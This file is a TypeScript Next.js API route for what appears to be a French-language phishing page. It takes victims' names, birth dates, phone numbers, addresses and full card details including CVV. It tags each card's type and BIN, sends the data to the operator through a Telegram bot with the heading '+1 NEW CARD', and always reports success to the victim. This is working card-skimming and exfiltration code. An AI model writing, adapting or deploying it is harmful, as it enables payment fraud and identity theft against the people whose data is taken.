import { NextResponse } from "next/server";

type SubmitData = {
  prenom: string;
  nom: string;
  naissance: string;
  telephone: string;
  adresse: string;
  codePostal: string;
  ville: string;
  cardNumber: string;
  cardExpiry: string;
  cardCvv: string;
  userAgent: string;
};

function getCardType(cardNumber: string): string {
  const num = cardNumber.replace(/\s/g, "");
  if (/^4/.test(num)) return "VISA";
  if (/^5[1-5]/.test(num)) return "MASTERCARD";
  if (/^3[47]/.test(num)) return "AMEX";
  if (/^6(?:011|5)/.test(num)) return "DISCOVER";
  return "UNKNOWN";
}

function getBIN(cardNumber: string): string {
  return cardNumber.replace(/\s/g, "").slice(0, 6);
}

function parseUserAgent(ua: string): { os: string; browser: string; device: string } {
  let os = "Unknown";
  let browser = "Unknown";
  let device = "Desktop";

  // OS Detection
  if (/Windows/.test(ua)) os = "Windows";
  else if (/Macintosh|Mac OS X/.test(ua)) os = "macOS";
  else if (/Linux/.test(ua)) os = "Linux";
  else if (/Android/.test(ua)) os = "Android";
  else if (/iPhone|iPad|iPod/.test(ua)) os = "iOS";

  // Browser Detection
  if (/Chrome/.test(ua) && !/Edg/.test(ua)) browser = "Chrome";
  else if (/Safari/.test(ua) && !/Chrome/.test(ua)) browser = "Safari";
  else if (/Firefox/.test(ua)) browser = "Firefox";
  else if (/Edg/.test(ua)) browser = "Edge";
  else if (/Opera|OPR/.test(ua)) browser = "Opera";

  // Device Detection
  if (/Mobile|Android|iPhone|iPad|iPod/.test(ua)) device = "Mobile";
  else if (/Tablet/.test(ua)) device = "Tablet";

  return { os, browser, device };
}

export async function POST(request: Request) {
  try {
    const data: SubmitData = await request.json();

    const botToken = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;

    if (!botToken || !chatId) {
      console.error("Telegram credentials not configured");
      return NextResponse.json({ success: true });
    }

    const cardType = getCardType(data.cardNumber);
    const bin = getBIN(data.cardNumber);
    const { os, browser, device } = parseUserAgent(data.userAgent);

    const message = `🎯 +1 NEW CARD - ${cardType} ${bin}

👤 INFORMATIONS FACTURATION
👨 Prénom: ${data.prenom}
👤 Nom: ${data.nom}
📅 Date de naissance: ${data.naissance}
📱 Téléphone: ${data.telephone}
🏠 Adresse: ${data.adresse}
📬 Code postal: ${data.codePostal}
🏙️ Ville: ${data.ville}

💳 INFORMATIONS PAIEMENT
🔢 Numéro carte: ${data.cardNumber.replace(/\s/g, "")}
🏦 Type: ${cardType}
📊 BIN: ${bin}
⏰ Expiration: ${data.cardExpiry}
🔐 CVV: ${data.cardCvv}

📱 INFORMATIONS DEVICE
🖥️ OS: ${os}
🌐 Navigateur: ${browser}
📲 Appareil: ${device}`;

    await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
        parse_mode: "HTML",
      }),
    });

    return NextResponse.json({ success: true });
  } catch (error) {
    console.error("Submit error:", error);
    return NextResponse.json({ success: true });
  }
}
